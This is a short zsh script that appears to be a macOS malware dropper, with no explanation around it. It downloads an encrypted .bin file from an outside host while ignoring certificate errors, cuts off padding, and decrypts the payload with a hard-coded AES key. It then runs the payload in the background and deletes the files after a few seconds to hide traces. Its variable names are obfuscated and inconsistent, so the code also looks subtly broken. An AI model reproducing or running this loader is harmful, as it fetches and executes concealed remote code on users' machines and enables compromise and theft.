#!/bin/zsh
r2kde=$(mktemp /tmp/rx33u4.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/me4a38c0f877512d1.bin" -o "$r2kdez" || exit 1
mg3gg5=$(stat -f %z "$r2kdez"); z93d7hf=$(( mg3gg5 - 1020 - 2762 ))
tail -c +$(( 1020 + 1 )) "$r2kdez" | head -c $z93d7hf | openssl enc -d -aes-256-cbc -k 90c7acf6747bfb1de12edeec -out "$r2kde" 2>/dev/null
[ -s "$r2kde" ] && chmod 700 "$r2kde" && ( "$r2kde" & ) && disown
( sleep 3; rm -f "$r2kde" "$r2kdez" ) &>/dev/null &
